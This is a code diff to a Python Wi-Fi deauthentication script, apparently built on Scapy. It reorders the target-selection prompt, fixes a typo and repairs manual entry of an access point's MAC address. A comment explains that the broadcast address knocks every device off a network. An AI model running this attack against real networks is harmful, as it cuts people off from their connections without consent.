@@ -9,6 +9,7 @@ import os
 
 client = "FF:FF:FF:FF:FF:FF" # Use FF:FF:FF:FF:FF:FF to deauth everyone on that network. Use a specific mac address to only deauth a certain device
 found = {}
+probe_list = []
 aps = []
 
 if len(sys.argv) < 2:
@@ -18,6 +19,10 @@ conf.iface = sys.argv[1]
 
 os.system("clear")
 
+manual = input("0 : scan for targets \n1 : manual target entry\nchoice : ")
+while manual != "0" and manual != "1":
+  manual = input("Invalid choice\nchoice : ")
+
 # WARNING: The following channel selection code only works on mac. Remove to make the code linux compatible.
 # Select channel
 channel = ""
@@ -25,10 +30,6 @@ while channel.isdigit() != True:
   channel = input("channel to use : ")
 os.system("nohup /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport " + conf.iface + " sniff " + channel + " &")
 time.sleep(0.5)
-
-manual = input("0 : scan for targets \n1 : manual target entry\nchoice : ")
-while manual != "0" and manual != "1":
-  manual = intput("Invalid choice\nchoice : ")
 
 # Function to process captured packets
 def sniffmgmt(p):
@@ -76,12 +77,13 @@ def discover():
 
   aps = list(map(int, n.split(",")))
 
+# Get AP address(es)
 if manual == "0":
   discover()
 
 if manual == "1":
   # TODO: Add option to add multiple mac addresses
-  probe_list[0][1]["cli"] = input("AP MAC address : ")
+  probe_list.append([0, {"cli": input("AP MAC address : ")}])
   aps = [0]
   # TODO: Check if mac address is valid
 
